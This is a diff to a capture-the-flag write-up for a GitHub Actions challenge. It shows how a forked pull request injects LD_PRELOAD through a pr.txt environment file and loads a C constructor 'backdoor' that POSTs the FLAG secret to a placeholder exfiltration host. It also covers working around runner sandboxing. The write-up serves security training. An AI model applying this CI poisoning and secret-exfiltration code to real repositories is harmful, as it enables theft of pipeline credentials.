@@ -2,8 +2,8 @@
 
 ## Description
 
-The whole `outputs` folder is uploaded in artifacts and is then downloaded in a subsidiary `worklow_run` containing the flag.
-The attacker can modify the `build.sh` script through a PR to abuse the fact that the `pr.txt` file content is set as environment variable, thus making it possible to do the `LD_PRELOAD` trick.
+The whole `outputs` folder is uploaded in artifacts and is then downloaded in a subsidiary `workflow_run` containing the flag.
+The attacker can modify the `Makefile` through a PR to abuse the fact that the `pr.txt` file content is set as environment variable, thus making it possible to do the `LD_PRELOAD` trick.
 
 ## Solution
 
@@ -15,40 +15,47 @@ gh repo fork --clone --default-branch-only '<ORG>/level-2'
 
 2. Create the `LD_PRELOAD` backdoor in a new `backdoor.c` file:
 
+> **Note:** `system()` / `popen()` fail with `Cannot fork` on GitHub Actions runners due to process sandboxing. Use a raw socket to exfiltrate instead.
+
 ```c
 #define _GNU_SOURCE
-#include <dlfcn.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <fcntl.h>
-#include <stdarg.h>
-#include <sys/types.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <unistd.h>
 
-int open(const char *pathname, int flags, ...) {
-    static int (*real_open)(const char *, int, ...) = NULL;
-
-    if (!real_open) {
-        real_open = dlsym(RTLD_NEXT, "open");
-    }
-
-	// Get the FLAG env variable
+__attribute__((constructor)) void pwn() {
     const char *flag = getenv("FLAG");
-    if (flag) {
-        fprintf(stderr, "[LD_PRELOAD LEAK] FLAG = %s\n", flag);
-    } else {
-        fprintf(stderr, "[LD_PRELOAD LEAK] FLAG is not set\n");
-    }
+    if (!flag) return;
 
-    // Handle optional third argument (mode) when O_CREAT is set
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode_t mode = va_arg(args, mode_t);
-        va_end(args);
-        return real_open(pathname, flags, mode);
-    }
+    char body[512], request[1024];
+    int body_len = snprintf(body, sizeof(body), "%s", flag);
 
-    return real_open(pathname, flags);
+    snprintf(request, sizeof(request),
+        "POST /exfil HTTP/1.0\r\n"
+        "Host: <EXFIL_HOST>\r\n"
+        "Content-Type: text/plain\r\n"
+        "Content-Length: %d\r\n"
+        "\r\n"
+        "%s",
+        body_len, body);
+
+    struct addrinfo hints, *res;
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    if (getaddrinfo("<EXFIL_HOST>", "80", &hints, &res) != 0) return;
+
+    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
+    if (sock < 0) { freeaddrinfo(res); return; }
+
+    if (connect(sock, res->ai_addr, res->ai_addrlen) == 0)
+        send(sock, request, strlen(request), 0);
+
+    close(sock);
+    freeaddrinfo(res);
 }
 ```
 
@@ -81,6 +88,9 @@ $(SO_TARGET): backdoor.c | outputs
 .PHONY: $(PR_FILE)
 $(PR_FILE): | outputs
 	printf "<PR_NUMBER>\nLD_PRELOAD=./backdoor.so" > $@
+
+outputs:
+	mkdir -p outputs
 
 # Clean everything
 clean:
